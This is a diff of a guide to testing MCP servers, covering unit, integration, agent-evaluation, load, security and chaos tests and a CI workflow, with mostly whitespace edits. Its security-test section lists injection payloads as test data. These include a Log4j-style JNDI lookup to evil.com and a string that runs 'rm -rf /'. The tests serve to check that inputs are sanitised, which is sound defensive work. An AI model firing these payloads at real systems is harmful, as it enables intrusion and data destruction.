@@ -1,4 +1,4 @@
-# Test — Comprehensive MCP Server Validation
+# Test
 
 Validate MCP servers for correctness, safety, performance, and AI agent compatibility. Focus on behavior, contracts, and real-world agent interactions through systematic testing approaches.
 
@@ -45,18 +45,18 @@ class TestProcessDataTool:
         result = process_data("valid input", {"option": "value"})
         assert result.success is True
         assert result.data == expected_output
-    
+
     def test_invalid_input_rejection(self):
         """Test tool properly rejects invalid input"""
         with pytest.raises(ValueError, match="Invalid input format"):
             process_data("", {})
-    
+
     def test_edge_case_handling(self):
         """Test tool handles edge cases gracefully"""
         large_input = "x" * 10000
         result = process_data(large_input, {})
         assert len(result.data) <= 1000  # Truncated appropriately
-    
+
     @patch('your_server.external_api.call_service')
     def test_dependency_failure_handling(self, mock_api):
         """Test tool handles external dependency failures"""
@@ -90,36 +90,36 @@ class TestMCPIntegration:
             info = await client.initialize()
             assert info.protocol_version == "0.1.0"
             assert info.server_info.name == "your-server"
-    
+
     async def test_tool_discovery(self):
         """Test tool discovery returns correct schemas"""
         async with McpClient() as client:
             await client.initialize()
             tools = await client.list_tools()
-            
+
             assert len(tools) > 0
             process_tool = next(t for t in tools if t.name == "process_data")
             assert process_tool.input_schema is not None
             assert "text" in process_tool.input_schema["properties"]
-    
+
     async def test_tool_execution_flow(self):
         """Test complete tool execution workflow"""
         async with McpClient() as client:
             await client.initialize()
-            
+
             result = await client.call_tool(
-                "process_data", 
+                "process_data",
                 {"text": "test input", "options": {}}
             )
-            
+
             assert result.is_error is False
             assert "result" in result.content[0].text
-    
+
     async def test_authorization_enforcement(self):
         """Test authorization is properly enforced"""
         async with McpClient(token="invalid") as client:
             await client.initialize()
-            
+
             with pytest.raises(PermissionError):
                 await client.call_tool("restricted_tool", {})
 ```
@@ -150,21 +150,21 @@ class TestCompleteWorkflow:
         await register_server(gateway, "test-server", "http://localhost:8000")
         yield gateway
         await gateway.shutdown()
-    
+
     async def test_client_to_server_via_gateway(self, gateway_setup):
         """Test complete client → gateway → server flow"""
         client = create_test_client(gateway_url="http://localhost:4444")
-        
+
         # Test tool discovery through gateway
         tools = await client.discover_tools()
         assert "process_data" in [t.name for t in tools]
-        
+
         # Test tool execution through gateway
         result = await client.execute_tool(
             "process_data",
             {"text": "integration test", "options": {"format": "json"}}
         )
-        
+
         assert result.success is True
         assert "integration test" in str(result.data)
 ```
@@ -193,7 +193,7 @@ class MCPServerEvaluator:
             model="claude-3-sonnet",
             mcp_server=server_url
         )
-    
+
     def create_task_suite(self) -> TaskSet:
         """Define evaluation tasks for your MCP server"""
         return TaskSet([
@@ -209,7 +209,7 @@ class MCPServerEvaluator:
                 ]
             },
             {
-                "name": "error_handling_task", 
+                "name": "error_handling_task",
                 "description": "Handle invalid input gracefully",
                 "input": "Process this invalid data: !!!invalid!!!",
                 "expected_behavior": "graceful_error_handling",
@@ -220,17 +220,17 @@ class MCPServerEvaluator:
                 ]
             }
         ])
-    
+
     async def run_evaluation(self) -> dict:
         """Run comprehensive agent evaluation"""
         task_suite = self.create_task_suite()
-        
+
         results = await self.evaluator.evaluate(
             agent=self.agent,
             tasks=task_suite,
             iterations=10  # Run multiple times for statistical significance
         )
-        
+
         return {
             "overall_score": results.overall_score,
             "task_success_rate": results.task_success_rate,
@@ -248,22 +248,22 @@ class MCPServerEvaluator:
 @pytest.mark.agent_eval
 class TestCrossModelCompatibility:
     models = ["claude-3-sonnet", "gpt-4", "gemini-pro"]
-    
+
     @pytest.mark.parametrize("model", models)
     async def test_model_tool_usage(self, model):
         """Test tool usage across different AI models"""
         agent = Agent(model=model, mcp_server=self.server_url)
-        
+
         # Test basic tool discovery
         tools = await agent.discover_tools()
         assert len(tools) > 0
-        
+
         # Test tool usage with standard task
         result = await agent.complete_task(
             "Process the data: name,value\ntest,123",
             available_tools=tools
         )
-        
+
         assert result.success_rate > 0.8  # 80% success threshold
         assert result.tool_calls > 0
         assert "123" in str(result.output)
@@ -277,7 +277,7 @@ class TestCrossModelCompatibility:
 class GoldenSetTester:
     def __init__(self):
         self.golden_sets = self.load_golden_sets()
-    
+
     def load_golden_sets(self) -> dict:
         """Load curated test cases with expected outputs"""
         return {
@@ -294,12 +294,12 @@ class GoldenSetTester:
                 }
             ]
         }
-    
+
     async def validate_against_golden_set(self, tool_name: str) -> dict:
         """Validate tool outputs against golden set"""
         test_cases = self.golden_sets.get(tool_name, [])
         results = []
-        
+
         for case in test_cases:
             try:
                 actual_output = await call_tool(tool_name, case["input"])
@@ -316,7 +316,7 @@ class GoldenSetTester:
                     "error": str(e),
                     "passed": False
                 })
-        
+
         return {
             "total_tests": len(test_cases),
             "passed": sum(1 for r in results if r["passed"]),
@@ -345,58 +345,58 @@ class LoadTester:
             "response_times": [],
             "errors": []
         }
-    
+
     async def single_request_test(self, tool_name: str, params: dict):
         """Execute single request and measure performance"""
         start_time = time.time()
-        
+
         try:
             result = await call_tool(tool_name, params)
             response_time = time.time() - start_time
-            
+
             self.metrics["requests_sent"] += 1
             self.metrics["requests_successful"] += 1
             self.metrics["response_times"].append(response_time)
-            
+
             return result
-            
+
         except Exception as e:
             self.metrics["requests_sent"] += 1
             self.metrics["errors"].append(str(e))
             raise
-    
-    async def load_test(self, tool_name: str, params: dict, 
+
+    async def load_test(self, tool_name: str, params: dict,
                        concurrent_users: int, duration_seconds: int):
         """Run load test with specified concurrency and duration"""
         end_time = time.time() + duration_seconds
         tasks = []
-        
+
         while time.time() < end_time:
             # Maintain specified concurrency
             active_tasks = [t for t in tasks if not t.done()]
-            
+
             while len(active_tasks) < concurrent_users and time.time() < end_time:
                 task = asyncio.create_task(
                     self.single_request_test(tool_name, params)
                 )
                 tasks.append(task)
                 active_tasks.append(task)
-                
+
                 # Small delay to prevent overwhelming
                 await asyncio.sleep(0.1)
-        
+
         # Wait for remaining tasks
         await asyncio.gather(*tasks, return_exceptions=True)
-        
+
         return self.analyze_results()
-    
+
     def analyze_results(self) -> dict:
         """Analyze load test results"""
         response_times = self.metrics["response_times"]
-        
+
         if not response_times:
             return {"error": "No successful responses recorded"}
-        
+
         return {
             "total_requests": self.metrics["requests_sent"],
             "successful_requests": self.metrics["requests_successful"],
@@ -414,28 +414,28 @@ class TestPerformance:
     async def test_single_user_latency(self):
         """Test response times under normal load"""
         tester = LoadTester("http://localhost:8000")
-        
+
         result = await tester.load_test(
             tool_name="process_data",
             params={"text": "performance test", "options": {}},
             concurrent_users=1,
             duration_seconds=30
         )
-        
+
         assert result["p95_response_time"] < 0.5  # 500ms SLO
         assert result["error_rate"] < 0.01  # <1% error rate
-    
+
     async def test_concurrent_users_throughput(self):
         """Test throughput under concurrent load"""
         tester = LoadTester("http://localhost:8000")
-        
+
         result = await tester.load_test(
             tool_name="process_data",
             params={"text": "load test", "options": {}},
             concurrent_users=10,
             duration_seconds=60
         )
-        
+
         assert result["requests_per_second"] > 50  # Minimum throughput
         assert result["error_rate"] < 0.05  # <5% error rate under load
 ```
@@ -450,7 +450,7 @@ class TestPerformance:
 class SecurityTester:
     def __init__(self, server_url: str):
         self.server_url = server_url
-    
+
     async def test_input_injection_attacks(self):
         """Test resistance to injection attacks"""
         injection_payloads = [
@@ -460,20 +460,20 @@ class SecurityTester:
             "${jndi:ldap://evil.com/a}",  # Log4j style
             "'; exec('import os; os.system(\"rm -rf /\")')"
         ]
-        
+
         for payload in injection_payloads:
             try:
                 result = await call_tool("process_data", {"text": payload})
-                
+
                 # Result should be sanitized, not executed
                 assert payload not in str(result)
                 assert "<script>" not in str(result).lower()
                 assert "drop table" not in str(result).lower()
-                
+
             except ValueError:
                 # Input rejection is acceptable
                 pass
-    
+
     async def test_authorization_bypass_attempts(self):
         """Test authorization cannot be bypassed"""
         bypass_attempts = [
@@ -482,20 +482,20 @@ class SecurityTester:
             {"user_id": -1},
             {"permissions": ["admin", "all"]},
         ]
-        
+
         for attempt in bypass_attempts:
             with pytest.raises((PermissionError, AuthenticationError)):
                 await call_tool_with_context("admin_tool", {}, context=attempt)
-    
+
     async def test_rate_limiting(self):
         """Test rate limiting prevents abuse"""
         # Make rapid requests to trigger rate limiting
         tasks = []
         for i in range(100):  # Exceed rate limit
             tasks.append(call_tool("process_data", {"text": f"test {i}"}))
-        
+
         results = await asyncio.gather(*tasks, return_exceptions=True)
-        
+
         # Some requests should be rate limited
         rate_limited_count = sum(1 for r in results if isinstance(r, RateLimitError))
         assert rate_limited_count > 0
@@ -517,27 +517,27 @@ class ChaosTester:
                 HTTPError("500 Internal Server Error"),
                 json.JSONDecodeError("Invalid JSON", "", 0)
             ]
-            
+
             for error in failure_scenarios:
                 mock_service.side_effect = error
-                
+
                 result = await call_tool("external_dependent_tool", {"param": "test"})
-                
+
                 # Should fail gracefully with meaningful error
                 assert "error" in result
                 assert "temporarily unavailable" in result["error"].lower()
-    
+
     async def test_resource_exhaustion(self):
         """Test behavior under resource constraints"""
         # Test with large inputs to stress memory
         large_input = "x" * (10 * 1024 * 1024)  # 10MB
-        
+
         try:
             result = await call_tool("process_data", {"text": large_input})
-            
+
             # Should either process successfully or fail gracefully
             assert result is not None
-            
+
         except ResourceExhaustedError as e:
             # Graceful resource exhaustion handling is acceptable
             assert "resource limit" in str(e).lower()
@@ -564,19 +564,19 @@ jobs:
         uses: actions/setup-python@v4
         with:
           python-version: '3.11'
-      
+
       - name: Install dependencies
         run: |
           pip install uv
           uv pip install -e .[test]
-      
+
       - name: Run unit tests
         run: |
           pytest tests/unit/ -v --cov=src --cov-report=xml
-      
+
       - name: Upload coverage
         uses: codecov/codecov-action@v3
-  
+
   integration-tests:
     runs-on: ubuntu-latest
     needs: unit-tests
@@ -585,11 +585,11 @@ jobs:
         run: |
           python -m src.server &
           sleep 5
-      
+
       - name: Run integration tests
         run: |
           pytest tests/integration/ -v
-  
+
   agent-evaluation:
     runs-on: ubuntu-latest
     needs: integration-tests
@@ -600,7 +600,7 @@ jobs:
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
           OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
-  
+
   performance-tests:
     runs-on: ubuntu-latest
     needs: integration-tests
@@ -608,7 +608,7 @@ jobs:
       - name: Run performance tests
         run: |
           pytest tests/performance/ -v --timeout=300
-  
+
   security-tests:
     runs-on: ubuntu-latest
     needs: unit-tests
@@ -715,14 +715,14 @@ def test_input_variations(input_data, expected):
 class RegressionTester:
     def __init__(self):
         self.baseline_metrics = self.load_baseline()
-    
+
     async def detect_regressions(self, current_results: dict) -> dict:
         """Compare current results against baseline"""
         regressions = {}
-        
+
         for metric, current_value in current_results.items():
             baseline_value = self.baseline_metrics.get(metric)
-            
+
             if baseline_value and self.is_regression(metric, current_value, baseline_value):
                 regressions[metric] = {
                     "current": current_value,
@@ -731,9 +731,9 @@ class RegressionTester:
                         current_value, baseline_value
                     )
                 }
-        
+
         return regressions
-    
+
     def is_regression(self, metric: str, current: float, baseline: float) -> bool:
         """Determine if current value represents a regression"""
         thresholds = {
@@ -741,9 +741,9 @@ class RegressionTester:
             "avg_response_time": 0.20,  # 20% increase is significant
             "agent_eval_score": 0.10,  # 10% drop is significant
         }
-        
+
         threshold = thresholds.get(metric, 0.15)  # Default 15%
-        
+
         if metric in ["success_rate", "agent_eval_score"]:
             # Lower is worse
             return current < baseline * (1 - threshold)
